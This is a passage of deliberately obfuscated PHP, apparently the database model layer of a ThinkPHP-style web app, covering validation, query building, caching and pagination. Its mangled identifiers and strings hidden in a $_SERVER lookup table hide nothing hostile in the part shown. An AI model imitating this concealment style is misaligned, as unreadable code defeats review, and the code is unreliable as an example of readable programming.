($ùÙÄı±Î == $³ö´Ÿá£[2] || $³ö´Ÿá£[2] == THINK_MODEL_BOTH) { switch (trim($³ö´Ÿá£[3])) { case $ı‡ÏìêÌ[397]: case $ı‡ÏìêÌ[398]: $ÄÓ¤£ÖŠ = isset($³ö´Ÿá£[4]) ? (array) $³ö´Ÿá£[4] : array(); if (isset($ëÄÓ£‘[$³ö´Ÿá£[0]])) { array_unshift($ÄÓ¤£ÖŠ, $ëÄÓ£‘[$³ö´Ÿá£[0]]); } if ($ı‡ÏìêÌ[397] == $³ö´Ÿá£[3]) { $ëÄÓ£‘[$³ö´Ÿá£[0]] = call_user_func_array($³ö´Ÿá£[1], $ÄÓ¤£ÖŠ); } else { $ëÄÓ£‘[$³ö´Ÿá£[0]] = call_user_func_array(array(&$this, $³ö´Ÿá£[1]), $ÄÓ¤£ÖŠ); } break; case $ı‡ÏìêÌ[350]: $ëÄÓ£‘[$³ö´Ÿá£[0]] = $ëÄÓ£‘[$³ö´Ÿá£[1]]; break; case $ı‡ÏìêÌ[399]: if ($ı‡ÏìêÌ[12] === $ëÄÓ£‘[$³ö´Ÿá£[0]]) { unset($ëÄÓ£‘[$³ö´Ÿá£[0]]); } break; case $ı‡ÏìêÌ[400]: default: $ëÄÓ£‘[$³ö´Ÿá£[0]] = $³ö´Ÿá£[1]; } if (!1 === $ëÄÓ£‘[$³ö´Ÿá£[0]]) { unset($ëÄÓ£‘[$³ö´Ÿá£[0]]); } } } } return $ëÄÓ£‘; } protected function autoValidation($™šşù¦÷, $™ğÂ¤Ò÷) { $òğëÔÖİ =& $_SERVER[²Ö÷öõ]; if (!empty($this->options[$òğëÔÖİ[401]])) { $Ï«ë«¨­ = $this->options[$òğëÔÖİ[401]]; unset($this->options[$òğëÔÖİ[401]]); } elseif (!empty($this->_validate)) { $Ï«ë«¨­ = $this->_validate; } if (isset($Ï«ë«¨­)) { if ($this->patchValidate) { $this->error = array(); } foreach ($Ï«ë«¨­ as $¿¨ÌøÑï => $ŞŠ äşÖ) { if (empty($ŞŠ äşÖ[5]) || $ŞŠ äşÖ[5] == THINK_MODEL_BOTH || $ŞŠ äşÖ[5] == $™ğÂ¤Ò÷) { if (0 == strpos($ŞŠ äşÖ[2], $òğëÔÖİ[402]) && strpos($ŞŠ äşÖ[2], $òğëÔÖİ[403])) { $ŞŠ äşÖ[2] = think_lang(substr($ŞŠ äşÖ[2], 2, -1)); } $ŞŠ äşÖ[3] = isset($ŞŠ äşÖ[3]) ? $ŞŠ äşÖ[3] : THINK_EXISTS_VALIDATE; $ŞŠ äşÖ[4] = isset($ŞŠ äşÖ[4]) ? $ŞŠ äşÖ[4] : $òğëÔÖİ[404]; switch ($ŞŠ äşÖ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($™šşù¦÷, $ŞŠ äşÖ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($òğëÔÖİ[12] != trim($™šşù¦÷[$ŞŠ äşÖ[0]])) { if (!1 === $this->_validationField($™šşù¦÷, $ŞŠ äşÖ)) { return !1; } } break; default: if (isset($™šşù¦÷[$ŞŠ äşÖ[0]])) { if (!1 === $this->_validationField($™šşù¦÷, $ŞŠ äşÖ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($´¡¢Šñì, $Ñ‰ŒÒ•”) { if (!1 === $this->_validationFieldItem($´¡¢Šñì, $Ñ‰ŒÒ•”)) { if ($this->patchValidate) { $this->error[$Ñ‰ŒÒ•”[0]] = $Ñ‰ŒÒ•”[2]; } else { $this->error = $Ñ‰ŒÒ•”[2]; return !1; } } return; } protected function _validationFieldItem($ò¼ Õ‚Ë, $³¤¢»®Á) { $¼²Öï€¹ =& $_SERVER[²Ö÷öõ]; switch (strtolower(trim($³¤¢»®Á[4]))) { case $¼²Öï€¹[397]: case $¼²Öï€¹[398]: $À¤ğóœó = isset($³¤¢»®Á[6]) ? (array) $³¤¢»®Á[6] : array(); if (is_string($³¤¢»®Á[0]) && strpos($³¤¢»®Á[0], $¼²Öï€¹[50])) { $³¤¢»®Á[0] = explode($¼²Öï€¹[50], $³¤¢»®Á[0]); } if (is_array($³¤¢»®Á[0])) { foreach ($³¤¢»®Á[0] as $û®õâİã) { $ç°‘÷“ô[$û®õâİã] = $ò¼ Õ‚Ë[$û®õâİã]; } array_unshift($À¤ğóœó, $ç°‘÷“ô); } else { array_unshift($À¤ğóœó, $ò¼ Õ‚Ë[$³¤¢»®Á[0]]); } if ($¼²Öï€¹[397] == $³¤¢»®Á[4]) { return call_user_func_array($³¤¢»®Á[1], $À¤ğóœó); } else { return call_user_func_array(array(&$this, $³¤¢»®Á[1]), $À¤ğóœó); } case $¼²Öï€¹[405]: return $ò¼ Õ‚Ë[$³¤¢»®Á[0]] == $ò¼ Õ‚Ë[$³¤¢»®Á[1]]; case $¼²Öï€¹[406]: if (is_string($³¤¢»®Á[0]) && strpos($³¤¢»®Á[0], $¼²Öï€¹[50])) { $³¤¢»®Á[0] = explode($¼²Öï€¹[50], $³¤¢»®Á[0]); } $Ã¯ºã’¸ = array(); if (is_array($³¤¢»®Á[0])) { foreach ($³¤¢»®Á[0] as $û®õâİã) { $Ã¯ºã’¸[$û®õâİã] = $ò¼ Õ‚Ë[$û®õâİã]; } } else { $Ã¯ºã’¸[$³¤¢»®Á[0]] = $ò¼ Õ‚Ë[$³¤¢»®Á[0]]; } if (!empty($ò¼ Õ‚Ë[$this->getPk()])) { $Ã¯ºã’¸[$this->getPk()] = array($¼²Öï€¹[407], $ò¼ Õ‚Ë[$this->getPk()]); } if ($this->where($Ã¯ºã’¸)->find()) { return !1; } return !0; default: return $this->check($ò¼ Õ‚Ë[$³¤¢»®Á[0]], $³¤¢»®Á[1], $³¤¢»®Á[4]); } } public function check($€³â¤ÔÊ, $á…›îÙ‚, $ßíİ˜è = "\x72\145\x67\145\x78") { $òªªÃ±÷ =& $_SERVER[²Ö÷öõ]; $ßíİ˜è = strtolower(trim($ßíİ˜è)); switch ($ßíİ˜è) { case $òªªÃ±÷[7]: case $òªªÃ±÷[408]: $êÎªÚÁõ = is_array($á…›îÙ‚) ? $á…›îÙ‚ : explode($òªªÃ±÷[50], $á…›îÙ‚); return $ßíİ˜è == $òªªÃ±÷[7] ? in_array($€³â¤ÔÊ, $êÎªÚÁõ) : !in_array($€³â¤ÔÊ, $êÎªÚÁõ); case $òªªÃ±÷[409]: case $òªªÃ±÷[410]: if (is_array($á…›îÙ‚)) { $æŸİ‚õ· = $á…›îÙ‚[0]; $—»ºñ•Ë = $á…›îÙ‚[1]; } else { list($æŸİ‚õ·, $—»ºñ•Ë) = explode($òªªÃ±÷[50], $á…›îÙ‚); } return $ßíİ˜è == $òªªÃ±÷[409] ? $€³â¤ÔÊ >= $æŸİ‚õ· && $€³â¤ÔÊ <= $—»ºñ•Ë : $€³â¤ÔÊ < $æŸİ‚õ· || $€³â¤ÔÊ > $—»ºñ•Ë; case $òªªÃ±÷[411]: case $òªªÃ±÷[412]: return $ßíİ˜è == $òªªÃ±÷[411] ? $€³â¤ÔÊ == $á…›îÙ‚ : $€³â¤ÔÊ != $á…›îÙ‚; case $òªªÃ±÷[413]: $Ÿå’åÆ€ = mb_strlen($€³â¤ÔÊ, $òªªÃ±÷[414]); if (strpos($á…›îÙ‚, $òªªÃ±÷[50])) { list($æŸİ‚õ·, $—»ºñ•Ë) = explode($òªªÃ±÷[50], $á…›îÙ‚); return $Ÿå’åÆ€ >= $æŸİ‚õ· && $Ÿå’åÆ€ <= $—»ºñ•Ë; } else { return $Ÿå’åÆ€ == $á…›îÙ‚; } case $òªªÃ±÷[415]: list($­»²¦ûå, $øÍ‚¼Ü…) = explode($òªªÃ±÷[50], $á…›îÙ‚); if (!is_numeric($­»²¦ûå)) { $­»²¦ûå = strtotime($­»²¦ûå); } if (!is_numeric($øÍ‚¼Ü…)) { $øÍ‚¼Ü… = strtotime($øÍ‚¼Ü…); } return NOW_TIME >= $­»²¦ûå && NOW_TIME <= $øÍ‚¼Ü…; case $òªªÃ±÷[416]: return in_array(get_client_ip(), explode($òªªÃ±÷[50], $á…›îÙ‚)); case $òªªÃ±÷[417]: return !in_array(get_client_ip(), explode($òªªÃ±÷[50], $á…›îÙ‚)); case $òªªÃ±÷[404]: default: return $this->regex($€³â¤ÔÊ, $á…›îÙ‚); } } public function query($Ì÷Ğ¤ü„, $×Í‚Áç = false) { $Û‘Û³Ø =& $_SERVER[²Ö÷öõ]; if (!is_bool($×Í‚Áç) && !is_array($×Í‚Áç)) { $×Í‚Áç = func_get_args(); array_shift($×Í‚Áç); } $Ì÷Ğ¤ü„ = str_replace(array($Û‘Û³Ø[262], $Û‘Û³Ø[418]), $Û‘Û³Ø[53], $Ì÷Ğ¤ü„); $Ì÷Ğ¤ü„ = $this->parseSql($Ì÷Ğ¤ü„, $×Í‚Áç); return $this->db->query($Ì÷Ğ¤ü„); } public function execute($êÁÑØ‰¦, $×ª·æÓµ = false) { if (!is_bool($×ª·æÓµ) && !is_array($×ª·æÓµ)) { $×ª·æÓµ = func_get_args(); array_shift($×ª·æÓµ); } $êÁÑØ‰¦ = $this->parseSql($êÁÑØ‰¦, $×ª·æÓµ); return $this->db->execute($êÁÑØ‰¦); } protected function parseSql($ÕÉêÇşî, $êÔŸ¸ñÔ) { $ĞÒ ãìÁ =& $_SERVER[²Ö÷öõ]; if (!0 === $êÔŸ¸ñÔ) { $›×Ò¶—Ä = $this->_parseOptions(); $ÕÉêÇşî = $this->db->parseSql($ÕÉêÇşî, $›×Ò¶—Ä); } elseif (is_array($êÔŸ¸ñÔ)) { $êÔŸ¸ñÔ = array_map(array($this->db, $ĞÒ ãìÁ[419]), $êÔŸ¸ñÔ); $ÕÉêÇşî = vsprintf($ÕÉêÇşî, $êÔŸ¸ñÔ); } else { $ÕÉêÇşî = strtr($ÕÉêÇşî, array($ĞÒ ãìÁ[420] => $this->getTableName(), $ĞÒ ãìÁ[421] => think_config($ĞÒ ãìÁ[321]))); } $this->db->setModel($this->name); return $ÕÉêÇşî; } public function db($‘è¢ó÷Ö = '', $ùôîÉö = '', $›ŠÔì¬“ = array()) { $îÁŒ×­š =& $_SERVER[²Ö÷öõ]; if ($îÁŒ×­š[12] === $‘è¢ó÷Ö && $this->db) { return $this->db; } static $Êõ‘èÚ = array(); static $Ï•ÃâÆã = array(); if (!isset($Ï•ÃâÆã[$‘è¢ó÷Ö]) || isset($Ï•ÃâÆã[$‘è¢ó÷Ö]) && $ùôîÉö && $Êõ‘èÚ[$‘è¢ó÷Ö] != $ùôîÉö) { if (!empty($ùôîÉö) && is_string($ùôîÉö) && !1 === strpos($ùôîÉö, $îÁŒ×­š[8])) { $ùôîÉö = think_config($ùôîÉö); } $‘è¢ó÷Ö = think_guid($ùôîÉö); $Ï•ÃâÆã[$‘è¢ó÷Ö] = Db::getInstance($ùôîÉö); } elseif (NULL === $ùôîÉö) { $Ï•ÃâÆã[$‘è¢ó÷Ö]->close(); unset($Ï•ÃâÆã[$‘è¢ó÷Ö]); return; } if (!empty($›ŠÔì¬“)) { if (is_string($›ŠÔì¬“)) { parse_str($›ŠÔì¬“, $›ŠÔì¬“); } foreach ($›ŠÔì¬“ as $ÂıËåÒ¹ => $ºàè¡Ô›) { $this->setProperty($ÂıËåÒ¹, $ºàè¡Ô›); } } $Êõ‘èÚ[$‘è¢ó÷Ö] = $ùôîÉö; $this->db = $Ï•ÃâÆã[$‘è¢ó÷Ö]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $¿™½Ò†” = get_class($this); if ($¿™½Ò†” == $_SERVER[²Ö÷öõ][422]) { return $this->name; } $this->name = substr($¿™½Ò†”, 0, -5); } return $this->name; } public function getTableName() { $¼Ùáó×Ä =& $_SERVER[²Ö÷öõ]; if (empty($this->trueTableName)) { $¯Œ» à = !empty($this->tablePrefix) ? $this->tablePrefix : $¼Ùáó×Ä[12]; if (!empty($this->tableName)) { $¯Œ» à .= $this->tableName; } else { $¯Œ» à .= think_parse_name($this->name); } $this->trueTableName = strtolower($¯Œ» à); } return (!empty($this->dbName) ? $this->dbName . $¼Ùáó×Ä[10] : $¼Ùáó×Ä[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $®“³½ø› =& $_SERVER[²Ö÷öõ]; return isset($this->fields[$®“³½ø›[328]]) ? $this->fields[$®“³½ø›[328]] : $this->pk; } public function getDbFields() { $ÆÙ¶ÄîÉ =& $_SERVER[²Ö÷öõ]; if (isset($this->options[$ÆÙ¶ÄîÉ[356]])) { $¿²ğ±” = $this->db->getFields($this->options[$ÆÙ¶ÄîÉ[356]]); return $¿²ğ±” ? array_keys($¿²ğ±”) : !1; } if ($this->fields) { $¿²ğ±” = $this->fields; unset($¿²ğ±”[$ÆÙ¶ÄîÉ[327]], $¿²ğ±”[$ÆÙ¶ÄîÉ[328]], $¿²ğ±”[$ÆÙ¶ÄîÉ[329]], $¿²ğ±”[$ÆÙ¶ÄîÉ[326]]); return $¿²ğ±”; } return !1; } public function data($£ï¥é£§ = '') { $ÂÃğ–ÏÏ =& $_SERVER[²Ö÷öõ]; if ($ÂÃğ–ÏÏ[12] === $£ï¥é£§ && !empty($this->data)) { return $this->data; } if (is_object($£ï¥é£§)) { $£ï¥é£§ = get_object_vars($£ï¥é£§); } elseif (is_string($£ï¥é£§)) { parse_str($£ï¥é£§, $£ï¥é£§); } elseif (!is_array($£ï¥é£§)) { think_exception(think_lang($ÂÃğ–ÏÏ[348])); } $this->data = $£ï¥é£§; return $this; } public function join($æúçøÄ¿) { $ÁÒó¹õ¦ =& $_SERVER[²Ö÷öõ]; if (is_array($æúçøÄ¿)) { $this->options[$ÁÒó¹õ¦[359]] = $æúçøÄ¿; } elseif (!empty($æúçøÄ¿)) { $this->options[$ÁÒó¹õ¦[359]][] = $æúçøÄ¿; } return $this; } public function union($‘µø×º, $»š…ãÎÓ = false) { $ìÌ§ï¡ =& $_SERVER[²Ö÷öõ]; if (empty($‘µø×º)) { return $this; } if ($»š…ãÎÓ) { $this->options[$ìÌ§ï¡[423]][$ìÌ§ï¡[424]] = !0; } if (is_object($‘µø×º)) { $‘µø×º = get_object_vars($‘µø×º); } if (is_string($‘µø×º)) { $áĞ¨·”ê = $‘µø×º; } elseif (is_array($‘µø×º)) { if (isset($‘µø×º[0])) { $this->options[$ìÌ§ï¡[423]] = array_merge($this->options[$ìÌ§ï¡[423]], $‘µø×º); return $this; } else { $áĞ¨·”ê = $‘µø×º; } } else { think_exception(think_lang($ìÌ§ï¡[348])); } $this->options[$ìÌ§ï¡[423]][] = $áĞ¨·”ê; return $this; } public function cache($êçÄòê§ = true, $›ôÆ¢·Ğ = null, $Ô¦Êè±ö = '') { $˜¾¶„ =& $_SERVER[²Ö÷öõ]; if (!1 !== $êçÄòê§) { $this->options[$˜¾¶„[425]] = array($˜¾¶„[97] => $êçÄòê§, $˜¾¶„[415] => $›ôÆ¢·Ğ, $˜¾¶„[33] => $Ô¦Êè±ö); } return $this; } public function field($è¤áñÂ®, $ù“»± ÷ = false) { $Â³ÂŒ¾ =& $_SERVER[²Ö÷öõ]; if (!0 === $è¤áñÂ®) { $²†…ïÈ = $this->getDbFields(); $è¤áñÂ® = $²†…ïÈ ? $²†…ïÈ : $Â³ÂŒ¾[220]; } elseif ($ù“»± ÷) { if (is_string($è¤áñÂ®)) { $è¤áñÂ® = explode($Â³ÂŒ¾[50], $è¤áñÂ®); } $²†…ïÈ = $this->getDbFields(); $è¤áñÂ® = $²†…ïÈ ? array_diff($²†…ïÈ, $è¤áñÂ®) : $è¤áñÂ®; } $this->options[$Â³ÂŒ¾[350]] = $è¤áñÂ®; return $this; } public function scope($ã µñ‚” = '', $Æ·‘Åóµ = NULL) { $×ÒüÍóé =& $_SERVER[²Ö÷öõ]; if ($×ÒüÍóé[12] === $ã µñ‚”) { if (isset($this->_scope[$×ÒüÍóé[37]])) { $²Ù··ÅÇ = $this->_scope[$×ÒüÍóé[37]]; } else { return $this; } } elseif (is_string($ã µñ‚”)) { $œößÊğ… = explode($×ÒüÍóé[50], $ã µñ‚”); $²Ù··ÅÇ = array(); foreach ($œößÊğ… as $îÖåÊ·Û) { if (!isset($this->_scope[$îÖåÊ·Û])) { continue; } $²Ù··ÅÇ = array_merge($²Ù··ÅÇ, $this->_scope[$îÖåÊ·Û]); } if (!empty($Æ·‘Åóµ) && is_array($Æ·‘Åóµ)) { $²Ù··ÅÇ = array_merge($²Ù··ÅÇ, $Æ·‘Åóµ); } } elseif (is_array($ã µñ‚”)) { $²Ù··ÅÇ = $ã µñ‚”; } if (is_array($²Ù··ÅÇ) && !empty($²Ù··ÅÇ)) { $this->options = array_merge($this->options, array_change_key_case($²Ù··ÅÇ)); } return $this; } public function where($ÅñÁæ£º, $ø‹·Õî× = null) { $›ä×¾Ç½ =& $_SERVER[²Ö÷öõ]; if (!is_null($ø‹·Õî×) && is_string($ÅñÁæ£º)) { if (!is_array($ø‹·Õî×)) { $ø‹·Õî× = func_get_args(); array_shift($ø‹·Õî×); } $ø‹·Õî× = array_map(array($this->db, $›ä×¾Ç½[419]), $ø‹·Õî×); $ÅñÁæ£º = vsprintf($ÅñÁæ£º, $ø‹·Õî×); } elseif (is_object($ÅñÁæ£º)) { $ÅñÁæ£º = get_object_vars($ÅñÁæ£º); } elseif (is_array($ÅñÁæ£º)) { foreach ($ÅñÁæ£º as $íîƒÊÂË => $ÃŒ…åÇ) { if ((is_numeric($íîƒÊÂË) || !$íîƒÊÂË) && is_string($ÃŒ…åÇ)) { if (strpos($ÃŒ…åÇ, $›ä×¾Ç½[426]) === 0) { continue; } think_trace($›ä×¾Ç½[427], $›ä×¾Ç½[12], $›ä×¾Ç½[49]); die; } } } if (is_string($ÅñÁæ£º) && $›ä×¾Ç½[12] != $ÅñÁæ£º) { $Œ¿•¨­× = array(); $Œ¿•¨­×[$›ä×¾Ç½[428]] = $ÅñÁæ£º; $ÅñÁæ£º = $Œ¿•¨­×; } if (isset($this->options[$›ä×¾Ç½[352]])) { $this->options[$›ä×¾Ç½[352]] = array_merge($this->options[$›ä×¾Ç½[352]], $ÅñÁæ£º); } else { $this->options[$›ä×¾Ç½[352]] = $ÅñÁæ£º; } return $this; } public function limit($Šæó½–, $öïù†œ¯ = null) { $«ŒÛªÜ¿ =& $_SERVER[²Ö÷öõ]; $this->options[$«ŒÛªÜ¿[368]] = is_null($öïù†œ¯) ? $Šæó½– : $Šæó½– . $«ŒÛªÜ¿[50] . $öïù†œ¯; return $this; } public function page($ó¦• Û, $¨İêºÎÂ = null) { $‘á’©Şç =& $_SERVER[²Ö÷öõ]; $this->options[$‘á’©Şç[429]] = is_null($¨İêºÎÂ) ? $ó¦• Û : $ó¦• Û . $‘á’©Şç[50] . $¨İêºÎÂ; return $this; } public function comment($½¼á´Ş) { $this->options[$_SERVER[²Ö÷öõ][430]] = $½¼á´Ş; return $this; } public function setProperty($¨âªÄİ, $Êæ Ÿ) { if (property_exists($this, $¨âªÄİ)) { $this->{$¨âªÄİ} = $Êæ Ÿ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\x69\x66\x79\x54\151\155\x65", "\x74\x69\155\145", "\x69\x6e\x73\145\x72\164\54\x75\160\144\141\164\x65", "\x66\x75\x6e\143\164\x69\157\x6e"), array("\x63\162\x65\141\164\x65\x54\151\155\145", "\x74\151\x6d\145", "\x69\156\x73\x65\162\x74", "\146\x75\x6e\143\x74\x69\157\156")); public function setDataAuto($ú³ä¡Â÷) { $this->dataAuto = $ú³ä¡Â÷; } public function __construct($´ÔÃÜèã = '', $ ’Ûœš¢ = '', $Å¨ã¶°è = '') { parent::__construct($´ÔÃÜèã, $ ’Ûœš¢, $Å¨ã¶°è); } protected $tableMeta = array(); protected function _beforeInsert(&$§æ¡î¤Â, $×åÀã€Ô) { $›¢ö¤ü =& $_SERVER[²Ö÷öõ]; if (!$this->checkDataAutoHas($›¢ö¤ü[431])) { return; } $this->dataBeforeFilter($§æ¡î¤Â, $›¢ö¤ü[431]); } protected function _beforeUpdate(&$îüó–¡¡, $×á¯àŞ) { $Šçìßàú =& $_SERVER[²Ö÷öõ]; if (!$this->checkDataAutoHas($Šçìßàú[432])) { return; } $this->dataBeforeFilter($îüó–¡¡, $Šçìßàú[432]); } protected function _afterSelect(&$±—€Êİƒ, $±İáÃİÌ) { if (!is_array($±—€Êİƒ)) { return; } if (!$this->checkDataAutoHas($_SERVER[²Ö÷öõ][433])) { return; } foreach ($±—€Êİƒ as &$ˆé¬Á—¹) { $this->dataAfterFilter($ˆé¬Á—¹); } unset($ˆé¬Á—¹); } protected function _afterFind(&$ë×Ñù†, $ÀéÅŸæî) { if (!is_array($ë×Ñù†)) { return; } if (!$this->checkDataAutoHas($_SERVER[²Ö÷öõ][433])) { return; } $this->dataAfterFilter($ë×Ñù†); } public static function textEncode($ÈèÎ²»³) { if (!$ÈèÎ²»³) { return $ÈèÎ²»³; } $·êİ¾¨ò = json_encode($ÈèÎ²»³); $·êİ¾¨ò = preg_replace_callback($_SERVER[²Ö÷öõ][434], function ($¾İÏŒÀ°) { return addslashes($¾İÏŒÀ°[0]); }, $·êİ¾¨ò); return json_decode($·êİ¾¨ò); } public static function textDecode($«ğÁæã) { $ä›×–Øç =& $_SERVER[²Ö÷öõ]; $ß’®ƒ¸ = json_encode($«ğÁæã); $ß’®ƒ¸ = preg_replace_callback($ä›×–Øç[435], function ($ª°ş–ÆŸ) { return $_SERVER[²Ö÷öõ][100]; }, $ß’®ƒ¸); return json_decode($ß’®ƒ¸); } public function setAutoIncrement($¼è°Ñèª) { $ş–¸Ğ³ú = array($this->getPk() => $¼è°Ñèª); $Ñª‹Ë = $this->data($ş–¸Ğ³ú)->add(); if ($Ñª‹Ë) { $this->delete($Ñª‹Ë); } } public function getAutoIncrement() { $­£Œ¯á– = $this->getTableName(); $£ú”•¯ = $this->max($this->getPk()); $µí×é—ô = $this->query("\163\x68\x6f\167\x20\164\x61\142\154\145\x20\x73\x74\141\164\x75\163\40\x77\x68\x65\162\x65\x20\116\x61\155\x65\x3d\47{$­£Œ¯á–}\x27"); $÷²ÅÎÑ… = $µí×é—ô[0][$_SERVER[²Ö÷öõ][436]]; $Ğ×£ºªè = max($£ú”•¯, $÷²ÅÎÑ…); return $Ğ×£ºªè; } protected function _callBefore($³çÙÇî‚, $œ‹¿¢Ëà) { return $this->cacheCallCheck($³çÙÇî‚, $œ‹¿¢Ëà, !1); } protected function _callAfter($ËÏı£¯—, $ºÅî·Áü) { return $this->cacheCallCheck($ËÏı£¯—, $ºÅî·Áü, !0); } protected function cacheFunctionAlias($ƒÑ¾’ù—) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ˆ³ùöŠŸ, $ÊÑ’¼¼¨, $—¨øŸ‘¯ = false) { $…Ïé£¸­ = $this->cacheFunctionAlias($ÊÑ’¼¼¨); if (!$…Ïé£¸­) { return; } foreach ($…Ïé£¸­ as $Ë¬ğ¥Î© => $²É¦¼¤) { $´ÑÖµŸˆ = $²É¦¼¤[0]; $¨şşÒñ = explode($_SERVER[²Ö÷öõ][50], $²É¦¼¤[1]); if ($ˆ³ùöŠŸ == $Ë¬ğ¥Î©) { return $this->cacheFunctionGet($Ë¬ğ¥Î©, $´ÑÖµŸˆ); } if ($—¨øŸ‘¯ && in_array($ˆ³ùöŠŸ, $¨şşÒñ)) { $this->cacheFunctionClear($Ë¬ğ¥Î©, $´ÑÖµŸˆ); } } } public function cacheFunctionGet($Ùá±­äË, $…”ĞÁÁı) { $¬üç¾Õ = $this->cacheKeyMake($Ùá±­äË, $…”ĞÁÁı); $ù—Ó¨¸¯ = Cache::get($¬üç¾Õ); if (!is_array($ù—Ó¨¸¯)) { $ù—Ó¨¸¯ = call_user_func_array(array($this, $Ùá±­äË), array($…”ĞÁÁı, !0)); Cache::set($¬üç¾Õ, $ù—Ó¨¸¯); } return $ù—Ó¨¸¯; } public function cacheFunctionClear($­ÃŸÓĞ¬, $‡‘®…Ì) { $¶¤Ó†îş = $‡‘®…Ì; if (!is_array($‡‘®…Ì)) { $¶¤Ó†îş = array($‡‘®…Ì); } foreach ($¶¤Ó†îş as $úë”ßíû) { $ÓŒàÃşå = $this->cacheKeyMake($­ÃŸÓĞ¬, $úë”ßíû); Cache::remove($ÓŒàÃşå); } } private function cacheKeyMake($­Äú¥»÷, $ı¸·‘Éø) { $Ñß®Ü‰ =& $_SERVER[²Ö÷öõ]; return get_class($this) . $Ñß®Ü‰[11] . $­Äú¥»÷ . $Ñß®Ü‰[437] . $ı¸·‘Éø; } protected function selectPageReset() { $ß›Ää× =& $_SERVER[²Ö÷öõ]; if (isset($GLOBALS[$ß›Ää×[438]])) { return; } $GLOBALS[$ß›Ää×[438]] = isset($GLOBALS[$ß›Ää×[7]][$ß›Ää×[439]]) ? $GLOBALS[$ß›Ää×[7]][$ß›Ää×[439]] : !1; $GLOBALS[$ß›Ää×[440]] = isset($GLOBALS[$ß›Ää×[7]][$ß›Ää×[429]]) ? $GLOBALS[$ß›Ää×[7]][$ß›Ää×[429]] : !1; $GLOBALS[$ß›Ää×[7]][$ß›Ää×[439]] = !1; $GLOBALS[$ß›Ää×[7]][$ß›Ää×[429]] = !1; } protected function selectPageRestore() { $ùşĞÁ =& $_SERVER[²Ö÷öõ]; if (!isset($GLOBALS[$ùşĞÁ[438]])) { return; } $GLOBALS[$ùşĞÁ[7]][$ùşĞÁ[439]] = $GLOBALS[$ùşĞÁ[438]]; $GLOBALS[$ùşĞÁ[7]][$ùşĞÁ[429]] = $GLOBALS[$ùşĞÁ[440]]; if ($GLOBALS[$ùşĞÁ[7]][$ùşĞÁ[439]] === !1) { unset($GLOBALS[$ùşĞÁ[7]][$ùşĞÁ[439]]); } if ($GLOBALS[$ùşĞÁ[7]][$ùşĞÁ[429]] === !1) { unset($GLOBALS[$ùşĞÁ[7]][$ùşĞÁ[429]]); } unset($GLOBALS[$ùşĞÁ[438]]); unset($GLOBALS[$ùşĞÁ[440]]); } protected function selectPage($›»‚¼á = 200, $¥Ø’àâÙ = 1) { $‚ıúùá =& $_SERVER[²Ö÷öõ]; global $in; $öš™ğî¥ = $this->optionsValue(); $ºŒ™®‚Œ = 50000; $›»‚¼á = isset($in[$‚ıúùá[439]]) && $in[$‚ıúùá[439]] ? $in[$‚ıúùá[439]] : $›»‚¼á; if ($›»‚¼á === -1) { $in[$‚ıúùá[439]] = !1; $ºŒ™®‚Œ = 100000000; $›»‚¼á = $ºŒ™®‚Œ; } $…•èØÏÍ = $öš™ğî¥; $…•èØÏÍ[$‚ıúùá[441]] = array(); $›»‚¼á = intval($›»‚¼á); $›»‚¼á = $›»‚¼á <= 5 ? 5 : ($›»‚¼á >= $ºŒ™®‚Œ ? $ºŒ™®‚Œ : $›»‚¼á); $¥Ø’àâÙ = intval(isset($in[$‚ıúùá[429]]) && $in[$‚ıúùá[429]] ? $in[$‚ıúùá[429]] : $¥Ø’àâÙ); $¥Ø’àâÙ = $¥Ø’àâÙ <= 1 ? 1 : $¥Ø’àâÙ; $Õ˜†Šã‚ = array(); $Ò³‰Ñ¿ = 1; if ($¥Ø’àâÙ == 1 && $Ò³‰Ñ¿) { $this->optionsValue($öš™ğî¥); $Õ˜†Šã‚ = $this->page($¥Ø’àâÙ, $›»‚¼á)->select(); $ËŞ†ëÜÊ = is_array($Õ˜†Šã‚) ? count($Õ˜†Šã‚) : 0; if ($ËŞ†ëÜÊ < $›»‚¼á) { $Û½—şÂ = 1; } else { $this->optionsValue($…•èØÏÍ); $ËŞ†ëÜÊ = intval($this->count()); $Û½—şÂ = ceil($ËŞ†ëÜÊ / $›»‚¼á); } } else { $this->optionsValue($…•èØÏÍ); $ËŞ†ëÜÊ = intval($this->count()); $Û½—şÂ = ceil($ËŞ†ëÜÊ / $›»‚¼á); $¥Ø’àâÙ = $¥Ø’àâÙ >= $Û½—şÂ ? $Û½—şÂ : $¥Ø’àâÙ; $this->optionsValue($öš™ğî¥); $Õ˜†Šã‚ = $this->page($¥Ø’àâÙ, $›»‚¼á)->select(); } if (!is_array($Õ˜†Šã‚)) { $Õ˜†Šã‚ = array(); } if ($Û½—şÂ == 1) { $ËŞ†ëÜÊ = count($Õ˜†Šã‚); } $şÈƒê¯« = array($‚ıúùá[442] => array($‚ıúùá[443] => $ËŞ†ëÜÊ, $‚ıúùá[439] => $›»‚¼á, $‚ıúùá[429] => $¥Ø’àâÙ, $‚ıúùá[444] => $Û½—şÂ), $‚ıúùá[445] => $Õ˜†Šã‚); return $şÈƒê¯«; } protected function checkLength($©£âò“Á, $ëúÂµ¾á = 0, $ÌÑ÷®­‚ = '') { $À˜½¥İ =& $_SERVER[²Ö÷öõ]; $ëúÂµ¾á = $ëúÂµ¾á ? $ëúÂµ¾á : 65536; if (!$©£âò“Á || strlen($©£âò“Á) < $ëúÂµ¾á) { return; } $ÌÑ÷®­‚ = $ÌÑ÷®­‚ ? $ÌÑ÷®­‚ . $À˜½¥İ[74] : $À˜½¥İ[12]; show_json($ÌÑ÷®­‚ . LNG($À˜½¥İ[446]) . "\x28{$ëúÂµ¾á}\x29", !1); } protected function metaSet($¼Ğ–ßƒæ, $©©¼Ë› = null, $Ä”ÈèÏ = null) { 